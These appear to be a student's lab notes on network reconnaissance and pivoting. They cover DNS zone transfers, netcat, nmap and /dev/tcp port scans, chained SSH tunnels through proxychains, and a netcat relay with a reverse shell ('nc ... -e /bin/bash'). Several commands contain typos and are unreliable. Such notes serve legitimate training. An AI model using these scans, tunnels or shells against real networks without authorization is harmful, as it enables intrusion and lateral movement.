# Phase 1:
1. External Passive
   1. OSINT
# Phase 2
1. External Active
   1. Traceroute
   2. ping
   3. nmap external ips and port scan
   4. banner grabbing
# Phase 3
1. Internal Passive 
   1. ip address / ifconfig / ipconfig
   2. ip neighbor / arp -a
   3. ss /netstat
   4. ps -ef /top
   5. find
   6. tcpdump / wireshark / p0f
# Phase 4
1. Internal Active
   1. ping scan
   2. Traceroute
   3. arp
   4. port scan
   5. banner grabbing


## OSINT Stuff
[sitereport.com](https://sitereport.netcraft.com/)

```shell
nc 172.16.82.106 22
nc 172.16.82.106 21

dig facebook.com a #ip
dig facebook.com ns #name server
dig a.ns.facebook.com axfr facebook.com
#dig gets information from dns server, port 53
dig zonetransferme.com
dig axfr @nsztml.digi.ninja zonetransferme.com
#zone transfer uses TCP

nma -D 11.1.1.1,  12.1.1.1, 13.1.1.1, 192.168.2.1, 14.1.1.1
```
# PASSIVE RECON
```shell
whois ccboe.net

#dig
dig ccboe.net
dig ccboe.net A
dig ccboe.net AAAA
dig ccboe.net MX
dig ccboe.net NS
dig ccboe.net SOA
dig ccboe.net TXT

dig zonetransfer.me
dig zonetransfer.me A
dig zonetransfer.me AAAA
dig zonetransfer.me MX
dig zonetransfer.me NS
dig zonetransfer.me SOA
dig zonetransfer.me TXT
dig axfr @nsztm1.digi.ninja zonetransfer.me

#Determine the IP address, CIDR, MAC address of the local system:
ip addr
ip address

#View the contents of the local ARP cache:
ip nei
ip neighbo

#Determine open listening TCP/UDP port:
TCP:
netstat -antlp
ss -antlp

UDP:
netstat -anulp
ss -anulp

#Search for files on the local system:
find / -name hint* 2 > /dev/null
find / -iname flag* 2 > /dev/null

#Determine if a program is install on the local system:
whereis {program}
which {program}

#Look at all running processes/daemons:
ps -elf | grep {program}
top

#Identify OS information:
uname -A

#Passive sniffing:
sudo tcpdump -i eth0 "{filters}"
```
# ACTIVE RECON
```shell
#CURL: https://www.gnu.org/software/wget/manual/wget.html
#Display webage (text only)
curl http://172.16.82.106
curl http://172.16.82.106/file.txt
curl http://172.16.82.106:8080
#Displays FTP (text only)
curl ftp://172.16.82.106
curl ftp://172.16.82.106/file.txt

#WGET: https://curl.haxx.se/docs/manpage.html
#Download Webpage recursively ( -r will make a folder with url as name)
wget -r http://172.16.82.106
wget -r http://172.16.82.106:8080

#Download FTP recursively  ( -r will make a folder with url as name)
wget -r ftp://172.16.82.106

#Banner Grab a TCP or UDP port:
nc {ip address} {port}
nc 172.16.82.106 22
nc -u 172.16.82.106 53

#Vertical Scan of TCP ports on one IP using Netcat:
nc -nzvw1 172.16.82.106 21-23 80 2>&1 | grep -E 'succ|open'

#Vertical Scan of UDP ports on one IP using Netcat:
nc -nuzvw1 172.16.82.106 1000-2000 2>&1 | grep -E 'succ|open'
nc -nuzvw1 172.16.82.110 1980-1989 2>&1 | grep -E 'succ|open'

-------------------------------------------------------------------------
##Example
nc 10.50.30.212 25
##Now look at the uders
ssh -p 25 bob@10.50.30.212
##As bob run your scans what programs installed
    which nc
    #do a horizaonal scan
    for i in {100..110}; do nc -nvzw1 10.0.0.$i 20-23 80 2>&1 & done | grep -E 'succ|open'
    #101 21 22 80
    #103 21 22 80
    #102 22
    #104 21 22 23 80
    ftp 10.0.0.104 #this will log you in as anonymouse
    pwd #get the directory
    ls # now show the directory listing
-------------------------------------------------------------------------
# Its Tunnel Time
ssh -p 25 bob@10.50.30.212 -D 9050 -NT
# -p destination port
# -D Source port
proxychain ./scan.sh
#this will create the proxy chain and send the scan through the ssh Tunnel
#instead server establishing the client will do both
proxychains ftp 10.0.0.104 #this will make the connection via proxy chains
passive 
GET hint.txt
GET 
    #set mode to passive
proxychains curl ftp://10.0.0.104 #This will send the ftp command though the Tunnel
wget -r http://172.16.82.106:8080
ls 10.0.0.104/ #creates aa folder with the listing of the directory
-------------------------------------------------------------------------
#Horizontal Scan a range of IPs for specific TCP ports using Netcat:
for i in {1..254}; do nc -nvzw1 172.16.82.$i 20-23 80 2>&1 & done | grep -E 'succ|open'
    
#Horizontal Scan a range of IPs for specific UDP ports using Netcat:
for i in {1..254}; do nc -nuvzw1 172.16.82.$i 1000-2000 2>&1 & done | grep -E 'succ|open'
    
#Using NMAP:
nmap 172.16.82.106
nmap 172.16.82.96/27
nmap 172.16.82.106 -p 21-23,80
nmap 172.16.82.96/27 -p 21-23,80
nmap -sT 172.16.82.106 -p 21-23,80
nmap -sT 172.16.82.96/27 -p 21-23,80
nmap -Pn -sT 1172.16.82.96/27 -p 21-23,80
nmap -sT 172.16.82.106 -p 1-1023
nmap -sT 172.16.82.106 -p 1024-65535
nmap -sT 172.16.82.106 -p-

    #Identify what type of scan you want to perform:
        -sT - TCP Full Connect (default)
        -sS - SYN (half open) scan (need sudo)
        -sF - FIN scan (need sudo)
        -sX - Christmas (XMAS) scan (need sudo)
        -sN - Null (no TCP flags) scan (need sudo)
    When scanning a CIDR it will first PING to find active systems. (ping will not be performed when scanning 1 system)
        If ICMP is being blocked then you will need to disable the ping sweep to get reliable results.
            -Pn - disable the ping sweep
    -p to specify specific ports to scan (will scan the 1000 most common ports by default)
        -p 21-23,80
            hyphen (-) to specify a range
            comma (,) to specify discontinuous ports
        -p- (will scan all 65535 ports)
            Same as (-p 1-65535)
    172.16.82.106 - will scan only the 1 ip
    172.16.82.96/27 - will scan the entire /27 ip range.

#Using /dev/tcp:
#Vertical Scan 1 system for a range of ports using /DEV/TCP:
for p in {1..1023}; do(echo >/dev/tcp/172.16.82.106/$p) >/dev/null 2>&1 && echo "$p open"; done

#Using ping:
#Ping scan a range of IPs:
for i in {1..254}; do (ping -c 1 172.16.82.$i | grep "bytes from" &) ; done

-------------------------------------------------------------------------
# Secure Copy
scp student@10.10.0.40:hint.txt . #.present ..parent
#the boave will pull a file from comptur at its current directory
scp student@10.10.0.40:/home/student/hint.txt /home/student/newfile.txt
#this will place a file into the above directory

## Moving into the private network
    ssh student@172.16.82.106
    ssh 192.168.1.10
    scp -3 student@10.10.0.40:student_net_range_blue_only.png student@192.168.1.10:
    #scp -3 "source" student@10.10.0.40:student_net_range_blue_only.png"Spurce" student@192.168.1.10"desitnation"
    #local to remote
    #remote to local
    #local to local
#what if SSH isn't running on common port, LETS CHANGE IT YEAHHHHHHHHHHHHHHHHHHHHHHHHHH
    cd /etc/sshd
    #this wil edit the daemon file
    ssh_config # config file for all ssh parameters. modify this file to allow different listening ports etc
    sudo nano sshd_config
    sudo systemctl restart ssh
    nestat -antlp
    scp -P 29 flag.png student@172.16.82.106:
    -------------------------------------------------------------------------
    ssh student@172.16.82.106 -p 29 -L 1111:192.168.1.10:22:
    ssh "blue host" -p "blue host ssh port" -L "Blue priv host""Blue priv port"
    ssh student@172.16.82.106
     -p 29 #outbound port on the Blue Host
     -L 1111: #listening port on the internet host
     192.168.1.10: #the pricate ip
     22 #blue priv host ssh tunnel

     ssh student@127.0.0.1 -p 1111
     scp -P 1111 flag.png student@localhost: #this will send the file out the 1111 port to the priv computer 

     #now dynamic hosts, write in perspective of blue host 
     ssh student@172.16.82.106 -D 9050 -NT 
     proxychains scp flag.png student@192.168.1.10:
     #-P would be designatred port on the priv box
     ps -elf | grep 
     kill -9 "pid"


     #now using netcat for tunnels
     nc -lvp 1234 < flag.png

     nc 10.10.0.40 1234 > flag.png

     Internet client
     nc 172.16.82.106 1234
     ---------------------------------
     #2



     relay
     mkfifo fifopipe
     mknod nodpipe p
     10.
     nc -lvp 1234 <fifopipe | nc -lvp 4321 > fifopipe 
    ---------------------------------
     #2


     priv client
     nc 192.168.1.1 4321
     nc 172.16.82.106 1234 < flag.png
    ---------------------------------
     #2
     nc 192.168.1.1 4321 -e /bin/bash
```
More tunneling

ssh     -P<optional>  <user account>@<pivot ip>  -L <iptional local bind>:<local port>:<
        -p 22           student@172.16.82.115    -L 1111:localhost:22
        -p 1111         localhost

ssh -p22 student@176.16.82.106 -L 1111:localhost:22
ssh -p 1111 student@localhost
# this will pull the web page for the .106
ssh -p22 student@176.16.82.106 -L 1111:localhost:80
wget -r http://localhost:1111

# this will pull the webpage for the .10
ssh -p22 student@176.16.82.106 -L 1111:192.168.1.10:80
ssh student@176.16.82.106 -L 1111:192.168.1.10:80
wget -r http://localhost:1111

# this will pull the webpage for the .10
ssh -p22 student@176.16.82.106 -L 1111:localhost:23
ssh student@176.16.82.106 -L 1111:localhost:23
telnet localhost 1111

# now we are not on the internet host
# take you 106 telnet
ssh -p22 student@10.10.0.40 -R 1111:localhost:23
telnet localhost 1111 

# take you 106 telnet
ssh -p1111 student@localhost
wget -r http://localhost:1111
ssh -p22 student@10.10.0.40 -R 1111:192.168.1.10:22
telnet localhost 1111 

# Using the dynamic tunnel to get to private host only for TCP based stuff so you can send and recieve traffic on multiple ports
ssh student@<ip> -R 1111:(tgt ip):(tgt port) -NT
ssh -r 1111:(tgt ip):(tgt port) student@(ip) -NT
#uses proxy chains

- initial tunnel to get into the host A of the network
ssh student@10.50.30.99 -D 9050 -NT
- this will create a local tunnel on host A to get to the host B
ssh student@10.50.30.99 -L 1111:192.168.1.39:22 -NT
- this will call the original dynamic tunnel and the local on host using the port 11
ssh student@localhost -P 1111 -D 9050 -NT
- this will be the local tunnel from host b to host c
ssh student@localhost -P 1111 -L 1112:10.0.0.50:22 -NT
- this tunnel uses the dynmic tunnel created on internet host to the local tunnel created on C
ssh student@localhost -P 1112 -D 9050 -NT
- this will be the local tunnel from host c to host D
ssh student@localhost -P 1112 -L 1113:172.16.1.8:22 -NT
- now we create the dynamic forward ot the local port we created
ssh student@localhost -P 1113 -D 9050 -NT






















```